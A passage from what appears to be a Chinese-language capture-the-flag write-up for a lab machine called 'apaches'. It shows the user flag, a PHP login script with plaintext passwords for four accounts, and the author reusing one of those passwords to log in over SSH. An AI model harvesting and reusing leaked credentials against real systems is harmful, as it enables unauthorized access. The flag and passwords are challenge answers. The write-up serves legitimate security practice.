<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>sacagawea<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>sacagawea<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>sacagawea<span class="token punctuation">)</span>,1004<span class="token punctuation">(</span>Lipan<span class="token punctuation">)</span></code></pre>
<p>拿到了sacagawea的权限!</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">sacagawea@apaches:~$ <span class="token function">cat</span> u
<span class="token function">cat</span> user.txt 

                                                                                                                       
  _____ _                      __                                                      
 <span class="token operator">|</span>  ___<span class="token operator">|</span> <span class="token operator">|</span> __ _  __ _    ___  / _<span class="token operator">|</span>  ___  __ _  ___ __ _  __ _  __ ___      _____  __ _ 
 <span class="token operator">|</span> <span class="token operator">|</span>_  <span class="token operator">|</span> <span class="token operator">|</span>/ _<span class="token variable"><span class="token variable">`</span> <span class="token operator">|</span>/ _<span class="token variable">`</span></span> <span class="token operator">|</span>  / _ <span class="token punctuation">\</span><span class="token operator">|</span> <span class="token operator">|</span>_  / __<span class="token operator">|</span>/ _<span class="token variable"><span class="token variable">`</span> <span class="token operator">|</span>/ __/ _<span class="token variable">`</span></span> <span class="token operator">|</span>/ _<span class="token variable"><span class="token variable">`</span> <span class="token operator">|</span>/ _<span class="token variable">`</span></span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> /<span class="token punctuation">\</span> / / _ <span class="token punctuation">\</span>/ _` <span class="token operator">|</span>
 <span class="token operator">|</span>  _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>  _<span class="token operator">|</span> <span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span><span class="token punctuation">\</span> V  V /  __/ <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>
 <span class="token operator">|</span>_<span class="token operator">|</span>   <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>__, <span class="token operator">|</span>  <span class="token punctuation">\</span>___/<span class="token operator">|</span>_<span class="token operator">|</span>   <span class="token operator">|</span>___/<span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>__, <span class="token operator">|</span><span class="token punctuation">\</span>__,_<span class="token operator">|</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span>_/ <span class="token punctuation">\</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__,_<span class="token operator">|</span>
                <span class="token operator">|</span>___/                                   <span class="token operator">|</span>___/                          





****<span class="token punctuation">(</span>************************************,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.*,,,,,,
**/*******************/****************.,.,*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/,,,,,,
***************************************.,%/*,,,,,,,,,,*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,%,,,,,
//////////////////////***********************,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/%,,,,
////////////////////////////****************,,,,,,,,,*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,<span class="token punctuation">(</span>,,,
/////////<span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span>////<span class="token punctuation">(</span>//////*************,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/,,
////<span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">(</span>///////**********,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/,
//<span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token comment">###########((((((((/////(*************,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,*,,</span>
<span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">(</span><span class="token comment">####################(((((((/*,,,,,,,,//,,,,//,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,</span>
<span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">(</span>%<span class="token comment">########%###%######((((,,,,,,,,,,,*(/(,,,**/((/,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,</span>
<span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token comment">########%%%%%%%%%%%%%###,,,,,,,,,,,,,,*((/,,,,*((((((*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,</span>
<span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token comment">########%%%%%%%%%%%%%%,,,,,,,,,,,,,,**/(//,,,,//(((/(//*,,,,,,,,,,,,,,,,,,,,,,,,,,,,</span>
<span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token punctuation">(</span><span class="token comment">########%%%%%%%%%%%%%#,,,,,,,,,,,,,,,*((/**,,*///(((//*****,,,,*,,,,,*,,,,,,,,,,,,,,,</span>
<span class="token punctuation">((</span><span class="token punctuation">((</span><span class="token comment">########%%%%%%%%%%%%%(,,,,,,,,,,,,,,*,****/((**//((///***,,,,,,,,,,,,,,,,,,,,,,,,,,,,,</span>
<span class="token punctuation">((</span><span class="token punctuation">(</span><span class="token comment">#######%%%%%%%%%&amp;&amp;%%%%,,,,,,,,,,,**//(((#((##%#((((((/*,,,,,,,,,,,**,,,,,,,,,,,,,,,,,,,</span>
<span class="token comment">##########%%%%%%%%%%&amp;%%%,,,,,,,,,*,***((########%%%%%(/*/*(,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,*</span>
<span class="token comment">##########%%%%%%&amp;%&amp;&amp;&amp;&amp;&amp;%,,,,,,*******//((######%%%%%%%%#(,,*/,,,,,,,,,,*,,,,,,,,,,,,,,,,,,</span>
<span class="token comment">###########%%%%%&amp;&amp;&amp;&amp;&amp;&amp;%*,,,,*****////(((######%%%%%%%%%%%#/,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,</span>
<span class="token comment">#######%%%%%%%%&amp;&amp;&amp;&amp;&amp;&amp;&amp;%,*,,*******,,**//((#####%%%%%%%%%%##/,,,,,,,,,,,,,*,,,,,,,,,,,,,,,,</span>
<span class="token comment">###%%%%%%%%%%%%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;(,,,*******/((/*/*//(######(((#%%%###,,,,,,,,,,,,,,,,,,,,,,,,,,/,,,</span>
<span class="token comment">###%%%%%%%%%%%%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;,,,***//*///,.(,,**(#%%%#(*,**(#%%%%#,*#/,,,,,,,,,,,,,,,,,,,,,,,,,,</span>
<span class="token comment">###%%%%%%%%%%%&amp;%&amp;&amp;&amp;&amp;&amp;&amp;,,***///(#######(**/#%&amp;&amp;%%#%,/&amp;##(%%%#(##****,,,,,,,,,,,,,*,,,,,,,,,</span>
<span class="token comment">##%%%%%%%%%%%&amp;&amp;&amp;&amp;&amp;&amp;&amp;%/,,,,*///(#####((///(%&amp;%%%%%%%%%%%%&amp;%%###/,*,,,,,,,,,,,,,,,,,,,,,,,,,</span>
<span class="token comment">#%%%%%%%%%%%%&amp;&amp;&amp;&amp;&amp;&amp;&amp;%(/,,,**////(((((***(#&amp;&amp;%%%%%%%%%%%%%%%%%#/***,,,,,,,,,,,,,,,,,,,,,,,,</span>
<span class="token comment">##%%%%%%%%%%%%%&amp;&amp;&amp;&amp;&amp;%#(//***////((((***//#%&amp;&amp;%%%%%%%%%%%%%(%#,*/**,,,,,,,,,,,,,,,,,,,,,,,,</span>
<span class="token comment">###%%%%%%%%%%%%%&amp;%%#(#((/*,//////(/******/##//%%%%%%%%%%%%%*,,,/***,,,,,,,,,,,,,,,,,,,,,,,</span>
<span class="token comment">####%%%%%%%%%%%%%%%*((//(,#///////////(#%#%%%%&amp;&amp;%%%%%%%%#%%%,,*/*,,,,,,,,,,,,,,,,,,,,,,,,,</span>
<span class="token comment">#####%%%%%%%%%&amp;%%%.//#(/,.%%/////*,,,*,**((#%%%%%%%%%%%(%%/%,,*(*,,,,,,,,,,,,,,,,,,,,,,,,,</span>
<span class="token comment">#####%%%%%%%%%&amp;%,*(###(*%%%&amp;&amp;#//*****/(####%%%%%%%%%%%/,%#,,,,,/*,,,,,,,,,,,,,,,,*,,,,,,,,</span>
<span class="token comment">######%%%%%%%%&amp;((####(*#%%%#*,,,******//*((###%%%%%%#*,/%%/,,,,/,,,,,,,,,,,,,,,,,,,,,,,,,,</span>
<span class="token comment">######%%%%%%%%(,(#//,*,%%%#*,*,.,,***/((#########.//#/(%%%((,,,,*,,,,,,,,,,,,,,,,,,,,,,,,,</span>
<span class="token comment">#######%%%%%%,,##(%#/%&amp;%%/*,*,,.,*###(**///(,,,,,*((#/%%&amp;(,,,,,,(###%&amp;&amp;&amp;,*,,,,,,,,,,,,,,,,</span>
<span class="token comment">########%%%%,/#%#%%%,(//*,,**,..,,,,,,,,,,/%,,,,/#%##&amp;%&amp;#,,,,,**/*/%#%(&amp;%#**,,,,,,,,,,,,,,</span>
<span class="token comment">#########(/,,*,/%%&amp;,,*,**,*,/,,,,,,,,,,*/,##**,#*%#%%%&amp;&amp;#/(,,.,*/***/*(%##%%/(%//%#*,,,,,,</span>
<span class="token comment">######(,,,,,,####%,,*///,/*,,,,,,,*,,,##%***,(/#*#((&amp;&amp;&amp;&amp;&amp;/*,,,,,,,***,%%//(%%%%%%%(#&amp;,*,,*</span>
<span class="token punctuation">(</span><span class="token comment">###/,,,,,,,##%%&amp;.,*,#///(,(/,,,,,*,***//**./*##(#(#%%%%&amp;****,,*,,,**,#%%***//(%(%/%#,,,,*</span>
<span class="token comment">###*,,,,,,,#%#&amp;%#,*,#(#/%#((#&amp;,*****///,&amp;%(%(%%#,#*&amp;&amp;&amp;&amp;&amp;*/*/*,,.,,,**///*,*,**///%(%/%/*,,</span>
<span class="token punctuation">((</span>,,,,,.,,/**/%%,*,<span class="token comment">##%(%%/(%&amp;*,,**//(/*,,%*%%%/#(#%&amp;&amp;&amp;(&amp;***,,,,,.,**////*,,,**///,##(#%%%%</span>
/,,.,,,,,<span class="token comment">##(%&amp;,,,,#/%%/%/(#%*,,,**///*,%(.%#%%%,/#%(&amp;&amp;#&amp;,*/*,,,..,,*////*,,,,/,%%*//%%(///</span>
.,,<span class="token punctuation">..</span>.,,,<span class="token comment">#(%%(,**(/%%#%%#%%%,,**///*,%%,.#*/%#,*#((&amp;(###,/,,.,...*,.,///*,,,*/,(%,*(###%(/</span>
,,<span class="token punctuation">..</span><span class="token punctuation">..</span>,,/<span class="token comment">#(%%,(/(##&amp;%#%*/%*%.,*///*%#(.#%.%/%%*(&amp;&amp;,&amp;%%#*,,,,,,,.,/,..,/,#%/,**,,,,*/###%##</span>
.,,,,,,,<span class="token punctuation">(</span>*/<span class="token punctuation">(</span><span class="token comment">#/(((%&amp;*####/%#%(,//,,%%&amp;*&amp;(#%,/#//%%%&amp;&amp;%&amp;%,*,,.,,,,.*/.,,/*,,,,//,,,.#%(%%%%&amp;</span>
*<span class="token punctuation">(</span>,,,,*<span class="token punctuation">(</span>%<span class="token punctuation">(</span><span class="token comment">#/(/,(#%.%#%/##%,&amp;,*/*%%/%&amp;.%(%/%%#,##((##%&amp;#,/,/,.,*,/,/,.,*/*,,*/,,,,,#%&amp;%%%%&amp;</span>
.,,*,,<span class="token comment">###%#(#*#(%&amp;&amp;#%%#(%&amp;,%,*%&amp;*%&amp;,,#(%,%(%//&amp;(&amp;&amp;&amp;%%%&amp;*(,*,,,,,*,*/.,**,,,*/.,,,*///%%%#&amp;</span>
,,,,,,/<span class="token comment">#%%*(,(##%//#(,/,(**/#///(/((%*%%/%*%*#&amp;&amp;&amp;%&amp;&amp;,%/,#,,(/.,,.,,/,,,*,*****,,*///#%%%%%</span>
,,,,/<span class="token comment">#*#(###%%#&amp;/&amp;#%(%/%&amp;,%/,%&amp;#%,%%*&amp;&amp;*%,%**(%&amp;&amp;&amp;&amp;&amp;,&amp;(,#,*,,,,,,*(*/,,,%%/*,*,*//((#%%%%%</span>
,/,<span class="token comment">#(#%#%#%%#%&amp;%&amp;#%%%&amp;%&amp;,#&amp;,%&amp;(%&amp;*%&amp;&amp;&amp;/%&amp;%%/%%(%##%%&amp;&amp;*%&amp;,,/*,,*/,***,,(#%(,,,*/(((,%%%(%&amp;</span>
,.<span class="token punctuation">((</span>%%<span class="token comment">#%#%%#%%&amp;%&amp;%&amp;%&amp;%&amp;&amp;%&amp;%(&amp;%%&amp;,%&amp;/%&amp;%&amp;(%%%&amp;(%&amp;&amp;&amp;&amp;/&amp;&amp;(&amp;%/(/(*,*(%,//,,,*,,,%%*(((,#%%&amp;#&amp;&amp;</span>
,*/<span class="token comment">#%%%#%##%#%#&amp;%&amp;#&amp;#&amp;&amp;(&amp;&amp;,&amp;&amp;%&amp;&amp;%&amp;%&amp;&amp;(&amp;%&amp;&amp;*&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;(%&amp;/#///,,,/%%(/*,*,,/%%&amp;(((////%%/%%</span>
<span class="token punctuation">(</span>/%<span class="token punctuation">(</span><span class="token comment">###%(%%#&amp;#%#&amp;&amp;&amp;&amp;%&amp;/&amp;&amp;(&amp;&amp;#%&amp;(&amp;&amp;%&amp;%&amp;&amp;%%#%(&amp;&amp;&amp;&amp;&amp;&amp;%&amp;&amp;%&amp;&amp;%&amp;(/*(,*/(*//*,,,,,,*(((,#&amp;/*%%%##</span>
<span class="token comment">#%((#%%#%#%%%%&amp;%&amp;%&amp;%&amp;&amp;%&amp;&amp;(&amp;&amp;%&amp;%%&amp;#&amp;&amp;%&amp;#&amp;&amp;/&amp;&amp;#%%%&amp;&amp;&amp;&amp;%&amp;&amp;%&amp;&amp;#(/((,,**(/*,,,,**,#%,,%%//%%%%#</span>
%<span class="token comment">###%#%%#%#%#%#%(&amp;%&amp;&amp;(&amp;&amp;,%&amp;%&amp;&amp;%&amp;&amp;%&amp;#&amp;&amp;%&amp;%%%&amp;%&amp;&amp;&amp;&amp;&amp;&amp;&amp;%&amp;&amp;%&amp;&amp;%(/*,***/((/,,,,*,,#%%,**%%%%&amp;%#</span>
<span class="token punctuation">(</span><span class="token comment">####%#%%%%#%%%&amp;%&amp;%&amp;#%%%%&amp;%%&amp;(&amp;&amp;%&amp;&amp;%&amp;(%%(&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%%&amp;%%&amp;%&amp;&amp;*(#/(///(&amp;%%,/,.#%*%%*,,,/&amp;&amp;##</span>
<span class="token punctuation">(</span>/<span class="token punctuation">(</span><span class="token comment">##(%/%(%#&amp;(&amp;/%(&amp;&amp;#&amp;&amp;*%&amp;%&amp;&amp;%&amp;#&amp;&amp;#&amp;&amp;%%##%#%%&amp;&amp;&amp;%&amp;&amp;%&amp;&amp;%&amp;&amp;%&amp;&amp;///*,,/,(%,,,*,,(&amp;****,,,*%&amp;#*</span>
<span class="token comment">##%/%##%(%/%(&amp;#%&amp;%&amp;*%&amp;*%&amp;(%&amp;*&amp;&amp;%&amp;%%&amp;*%%*%%&amp;&amp;&amp;%&amp;&amp;&amp;&amp;&amp;&amp;&amp;#&amp;&amp;#&amp;&amp;*******,,,(,,,**//***,,,,,*%%#*</span>
,,,,****<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token comment">#&amp;/&amp;/&amp;*%#%&amp;/*&amp;&amp;#&amp;#%&amp;,%&amp;/&amp;%/%%#&amp;&amp;%&amp;&amp;&amp;&amp;(&amp;&amp;(&amp;&amp;%&amp;&amp;%&amp;&amp;,,/(,**,,,,,,*****,,,,,,,,**%**</span>
<span class="token punctuation">(</span>%%<span class="token punctuation">(</span>%/%*%,<span class="token operator">&amp;</span>,%<span class="token punctuation">(</span>%/<span class="token punctuation">(</span>/**<span class="token comment">#/#&amp;*&amp;&amp;*&amp;##&amp;*%&amp;,%%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;#&amp;%%&amp;(%&amp;(&amp;&amp;,,,*,,*,,,,,,,****,,,,,,,,,,(#*,</span>


You are on fire<span class="token operator">!</span><span class="token operator">!</span>

Flag: FlagsNeverQuitNeitherShouldYou</code></pre>
<p>拿到了user flag<br>在sacagawead的目录下有Development，下面还有个admin，然后里面有个check的脚本泄露了密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">sacagawea@apaches:~/Development/admin$ <span class="token function">cat</span> <span class="token number">2</span>-c
<span class="token function">cat</span> <span class="token number">2</span>-check.php 
<span class="token operator">&lt;</span>?php
// <span class="token punctuation">(</span>A<span class="token punctuation">)</span> START <span class="token environment constant">SESSION</span>
session_start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

// <span class="token punctuation">(</span>B<span class="token punctuation">)</span> HANDLE LOGIN
<span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>isset<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token punctuation">&#123;</span>
  // <span class="token punctuation">(</span>B1<span class="token punctuation">)</span> USERS <span class="token operator">&amp;</span> PASSWORDS - SET YOUR OWN <span class="token operator">!</span>
  <span class="token variable">$users</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"geronimo"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"12u7D9@4IA9uBO4pX9#6jZ3456"</span>,
    <span class="token string">"pocahontas"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"y2U1@8Ie&amp;OHwd^Ww3uAl"</span>,
    <span class="token string">"squanto"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"4Rl3^K8WDG@sG24Hq@ih"</span>,
    <span class="token string">"sacagawea"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"cU21X8&amp;uGswgYsL!raXC"</span>
  <span class="token punctuation">]</span><span class="token punctuation">;</span>

  // <span class="token punctuation">(</span>B2<span class="token punctuation">)</span> CHECK <span class="token operator">&amp;</span> VERIFY
  <span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$users</span><span class="token punctuation">[</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$users</span><span class="token punctuation">[</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  // <span class="token punctuation">(</span>B3<span class="token punctuation">)</span> FAILED LOGIN FLAG
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isset<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token punctuation">&#123;</span> <span class="token variable">$failed</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

// <span class="token punctuation">(</span>C<span class="token punctuation">)</span> REDIRECT <span class="token environment constant">USER</span> TO <span class="token environment constant">HOME</span> PAGE IF SIGNED IN
<span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token punctuation">&#123;</span>
  header<span class="token punctuation">(</span><span class="token string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>ssh测试了一下，发现pocahontas能够登录 <code>pocahontas:y2U1@8Ie&amp;OHwd^Ww3uAl</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh pocahontas@192.168.56.159</span>
                                                                                
                                                                                
                                                                                
                                                                  
                                                                        <span class="token operator">>></span>       <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span>         <span class="token operator">>></span>           <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>   <span class="token operator">>=</span><span class="token operator">>></span><span class="token operator">=</span><span class="token operator">></span>   
                                                                       <span class="token operator">>></span><span class="token operator">=</span><span class="token operator">></span>      <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span>      <span class="token operator">>></span><span class="token operator">=</span><span class="token operator">></span>       <span class="token operator">>=</span><span class="token operator">></span>   <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">></span>       <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span> 
                                                                      <span class="token operator">>></span> <span class="token operator">>=</span><span class="token operator">></span>     <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span>     <span class="token operator">>></span> <span class="token operator">>=</span><span class="token operator">></span>     <span class="token operator">>=</span><span class="token operator">></span>        <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">></span>        <span class="token operator">>=</span><span class="token operator">></span>       
                          ~                                          <span class="token operator">>=</span><span class="token operator">></span>  <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span>      <span class="token operator">>=</span><span class="token operator">></span>  <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span>        <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">>></span><span class="token operator">=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>      <span class="token operator">>=</span><span class="token operator">></span>     
                    <span class="token number">7</span>~   ~<span class="token operator">&amp;</span><span class="token builtin class-name">.</span>                                        <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">>></span><span class="token operator">=</span><span class="token operator">></span>   <span class="token operator">>=</span><span class="token operator">></span>          <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">>></span><span class="token operator">=</span><span class="token operator">></span>   <span class="token operator">>=</span><span class="token operator">></span>        <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">></span>             <span class="token operator">>=</span><span class="token operator">></span>  
                    G<span class="token operator">!</span>J <span class="token operator">!</span><span class="token number">75</span><span class="token operator">!</span>   ~G     <span class="token builtin class-name">:</span>                            <span class="token operator">>=</span><span class="token operator">></span>      <span class="token operator">>=</span><span class="token operator">></span>  <span class="token operator">>=</span><span class="token operator">></span>         <span class="token operator">>=</span><span class="token operator">></span>      <span class="token operator">>=</span><span class="token operator">></span>   <span class="token operator">>=</span><span class="token operator">></span>   <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">></span>       <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span> 
                   ?~:B<span class="token operator">!</span>. 5Y^<span class="token operator">!</span>~^B. :~J<span class="token operator">&amp;</span>                           <span class="token operator">>=</span><span class="token operator">></span>        <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">></span>        <span class="token operator">>=</span><span class="token operator">></span>        <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">></span>   <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>   <span class="token operator">>=</span><span class="token operator">>></span><span class="token operator">=</span><span class="token operator">></span>
                 .GG?~    B^<span class="token punctuation">..</span>.PB?<span class="token operator">!</span>^ ?5 <span class="token builtin class-name">.</span>                         
                <span class="token number">7</span><span class="token operator">&amp;</span>G:  <span class="token number">7</span>. JB7?7^<span class="token punctuation">..</span>   ^<span class="token operator">&amp;</span>P<span class="token operator">&amp;</span>Y .7<span class="token comment">#                     If at first you don't succeed. Try, try again! Sometimes the second time returns more!</span>
              .GG.  ~J. ?@5:  :~.  Y@@@@??<span class="token operator">!</span>?<span class="token comment">#                     </span>
             <span class="token builtin class-name">:</span><span class="token comment">#~  ~Y~  JJ  :77: .J&amp;@#57:  :&amp;!.~Y  .:              </span>
            <span class="token builtin class-name">:</span><span class="token operator">&amp;</span><span class="token builtin class-name">.</span> ^P7  ^J::<span class="token operator">!</span><span class="token number">7</span>^.:<span class="token operator">!</span>YJ<span class="token operator">!</span>:<span class="token punctuation">..</span><span class="token punctuation">..</span>  Y@@@@@<span class="token operator">&amp;</span>J5@<span class="token operator">!</span>              
            @7 Y5  :GP77~::~<span class="token operator">!</span>~<span class="token punctuation">..</span>.:^:<span class="token punctuation">..</span>:J<span class="token comment">#&amp;#GPJ!:.PG               </span>
           P@~B<span class="token comment"># ^B@G~^^!!~^^^^:...^7J7.       ^BP^?:             </span>
          ^@@@@@<span class="token operator">&amp;</span>@<span class="token comment">#~7G5J7~::.:^~?JJ7~::^^~~~?B@@@@@&amp;              </span>
          <span class="token operator">&amp;</span>J<span class="token operator">!</span><span class="token number">7</span>?P<span class="token comment">#@B@@@B!:!?77???7!~~!!?J5PPP5YJ??YPYJ~.           </span>
         ?P       :?B@<span class="token operator">&amp;</span><span class="token comment">#@#?7!^^~?55Y7^:..       .^?J5Y^           </span>
         ?B^^^::<span class="token punctuation">..</span>    ~G<span class="token operator">&amp;</span>@<span class="token comment">#YP#&amp;@B!....::::^~75B&amp;@@@@#G!           </span>
         <span class="token builtin class-name">:</span><span class="token operator">&amp;</span>~J?P<span class="token operator">&amp;</span>@@G?7<span class="token operator">!</span>^<span class="token punctuation">..</span>BG<span class="token operator">!</span>~7B@<span class="token comment">#5J7!!7?JPGBB#BB&amp;&amp;@@B^            </span>
         <span class="token operator">!</span><span class="token number">5</span> <span class="token comment">##J?PY    :JP&amp;    .@&amp;G5JY5GG57^:...   .~YBJ           </span>
        ~5  :P7<span class="token operator">!</span>^ <span class="token punctuation">..</span>^   ~@P~~~BB7^:.  .:~5G<span class="token operator">!</span> .:<span class="token operator">!</span>5B<span class="token operator">&amp;</span>@G<span class="token operator">!</span><span class="token operator">!</span>.          
       .P      ~PGB<span class="token comment">#5   P:5!B&amp;7~:Y&amp;#&amp;B&amp;&amp;#GPY7!!?5B@@&amp;G:           </span>
       Y7   ^^ .5GGB<span class="token operator">!</span>  <span class="token number">5</span>~<span class="token operator">!</span><span class="token number">7</span>:7<span class="token operator">!</span>G:. 7B7?~^^?G<span class="token comment">#P!....:GP             </span>
       .~^JJ^   <span class="token builtin class-name">.</span>     .G <span class="token comment">#..J ##!  J#~..:.  .7P#?^:.              </span>
